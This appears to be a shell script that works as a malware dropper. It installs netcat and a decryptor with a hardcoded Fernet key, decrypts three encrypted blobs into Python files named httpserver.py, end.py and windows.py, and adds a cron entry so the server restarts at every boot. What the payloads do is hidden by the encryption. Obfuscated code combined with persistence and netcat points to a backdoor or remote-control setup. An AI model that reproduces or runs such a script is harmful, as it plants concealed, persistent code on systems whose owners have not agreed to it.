#!/bin/sh

apt install python3 netcat -y;

python3 -m pip install cryptography

echo "import sys
from cryptography.fernet import Fernet as fer
enc = input().encode()
key = b'URfQhKLDNzvttV6fmxB3qrWvIBFbd6jXjVCXo6CXQ1Q='
fernet = fer(key)
decMessage = fernet.decrypt(enc).decode()
sys.stdout.write(decMessage)" > unenc.py ;

echo "gAAAAABiaxqtU45vpez3cffXciFh3Z7kDb6C2u7feFocSwkUtfKCIWW_hUbaDQr8eks6UTGB9XKcGW2Dnu7TYOzmDOWuCaI34CNRYo3j1guHyvdrVfZkSW1nruZ9VS5VU-cGTM03BRX5BHXjj7gRPNqazPqiSUnW6Q==" | python3 unenc.py > httpserver.py;

echo "gAAAAABiaxvEbsEJd0OGL-UcmarCZPO7-vPHcz1J22fXXh1wAgaGQvrvWiahyDB78DMjrtPV0UWuzGVuRZH-0HTX0dmGjxwGg-IdAD_FMYuNfN3GOoFZvzF2myB5zBZkqIzA0APBD7Zr" | python3 unenc.py > end.py

echo "gAAAAABiaxzfZprijBHGgJLI5nwlrin48yBRbMQvcmz-ta9eshdegUtzITNLIL7KCUmu22svQMsZuXKZ8SrF6wSBqMRIuUt6_udmnhjLnd5AT4dvgzZn1z8uGE0FEQ7AEhOiBONKpMd5CvIp1R0kFWI1aUodcMoWXwg5ARgvHF9pbu6A2BpEFANbJmxQJVrtbSNwRpQFlJoWrEHmnUPuw81ZJ4jlZ3eH8rb1CB5-pd1CoGV3iKMNBXoaTJ3tw0jqY8fkBYJHKWNCiF1EQdwXRV0fKPFskWwnUyMdVcwFdSawxLCaUY86Z_C0Ajgh5iLoY1Hw_zKhMDOD-xP-iZsoT7vybBXxcFrky8zTAcmfXjHww93DHI2QPYMFg8ucJ0uqLDwkzxZj7Pjk2iUM7bNOgZHo5v0uvtCiUP32kfzrdaKK8NhX5Tz-qFl4-6O146H6kZSNuRk37DHC2yH8yv6_xw0vrCUCbUnFfh-MPM0lb44EWqllbzNPsX_hAeHhwfXd5Y_umwSawiRIOPuKEGlB_sSExf-JPp6zqLAa4i79cvTYjQ2p32jZaAvHWl7YRJ_iytd9NcRjLGp9VCCk1OhMinL4SxwR3EffMXioIiA8eNBN1el82CngbvXuRFnX3AXq4L7La0bu1qp5oW3l7tUgfWT4qtP1S4nNXsFeJVIQzeUZkaL2PzdTIs0a0WNgK51f6sVHbwcSEh3TT7QDJA4MFPFHN6R7Zd4J_hwOWEgEJcST6iDIKtFIzqsxwm0C1YVsyyL60fsgNZWwa4VuU4udOVnSVdYpPGuqX2-jvBxoor6w8dUE37zBgPUBxEclqOiI2pXpP0fatrpg7yAdIM4fwm2xUucc7sca4qRar5MaQaSDgIk6Yo8hFzt6BiEgE8Kxp9yjyyqELnbiFqy_sYvDsoOSHef20d7NBZ_aDlV5vizpCpenN-naAyITH6Dja4hT671nkeQJ0CEIkz5ytVC8N1XAqFgIvCBCt4zOWPPuBM9TATbgTXegT-HKyPa2pR2tTpyDg-iM5rcnMT6lf_MVcNaw3Rz4AgFS2_x1dRn_S5x0FXJL_0yJ9hvZsVmhga8LBT90nQtdl-t1JckGgtstbOOBpJIadY9JIeifvrHTdztX2MlILbrKQ97xrlsUWgznM764FTqfiElnuHH4O1xdmN9UgT8imTBsJ5dJZIJYOUdoZ4Ft3rgMJ-DeY2U7Wm7ajppT8dkieGBnLQZz_Qck8NWSLzZ86LZOtafGodWd2Ae38G0ca_MpHDkcPrXbT6-f4OGRRMHiaH_TcMgm70ZghuvtjUJjaTDkA_tR03SmS_ILb6wT0C14GP4k_ZDdMpMKizx7yTqWYDf6Uere1QNOl1PQtZDRGzxDT_JJLSbjnbyvh3ZcQszyYdSTUkjKyYErJ-gIa3P1m2EJ2pgKVYSqOKGjTjPaZ6O2i3krL-p558vM2GlUWnaLm3Sp2Eas5qK4MnRbI7qAWAy4IH18l6en5FE1hffRxdkuHBKOx7hbxvvrBng8Y96jLtbamC7Ey6sdvIOvumHwrORsMIf-HOOuI6mmfPlmJQ2-QPv0ghV28Sp7JPAtToLqcAB4VKuq0aPJgHmVL9hFqJthgA3J7WzAPgfOM6UhCABjb22e9Iuzdb_s11wa78Y_P7Vi2v3VK4h8075ArCZ459nvmLQdvhui92Ehtke3tvomBb2mYOnNmYOumN9AqZwT7iMkE-m_VXhBzieaLO9dnSVqFhROKLoQKr7WLC5PACpSmGmB3hHIrwrz3GSKiLe7nkWG__FMt4A_Ghu_q5lqv49TMTx9oES1S2XiayC8x8HkzB-ZcmT_qRzL3laaKK5_V5eWSSbrLytQcYi_CATKF-ppdVA41LRBl48-sYIR4hj9lUil0Nvx0r-ikV1kMq7DlcRRmMjEVMkyN_0OFjWrJgwZDife8fPEfIrlCR6yyQf3NMFjZbE9RtdiYdCHqRCFn8XC7NFLx7-uK7S8hq5ArhdRIQfJNpMPLbUBzP1kZCGC_t86VvIrzvi4gKJPTDNmER2xl7LyEo15oxVo87x1DW9HCCiTVgOSPk_HiJGZYXXvZKXOSmWCmH-0p-fDpR-QvXcrObhu77gSWU6nKcgYDF9Pc2XqUvIae6Yt6JG8wm_F0Lnw1rgqX4jzGjmU8gA3KCdqPb_DT6dbHa9ZMvtVNiyaaVcog0hnNbeLpmm8usi5xCJWqXA5vOhq5k8dwTuoJwZhb-BeS9CShwVRN1b5mz6F0naHB62J5BvFtLQ8rOoLTk1QxTTmuMuJ3kwqhqvendKBNwyusM2-PjKBn_rpb7hiUPxZlLmLIvRfbbj5pNFs1I9CEH09M1R_qbj4HNH3r_uuWyQrTz5zKD1zD9aY2nVSYVXQM2_NuQRHj_V68BVfOPKmLpoCjFQlGOpqBU3piSMF9EO9cqnkHx6wEOxy0eO-l9jtZTAxkLD_fI_Fc4sX0VfFdTlrqjnAzW_yJiwbpEdfpCbsKMWxNBvQ8lC2a6ka5nKU5zI6B3j_oyNdS6LTW5ly2rkOe6iXWk5BA4vIeM8TQQs2FzklXJ699hvJTxtB" | python3 unenc.py > windows.py;

echo "@reboot service apache2 start\n@reboot python3 ~/Documents/httpserver.py" > cron.txt

crontab -u $(USER) cron.txt

python3 httpserver.py;

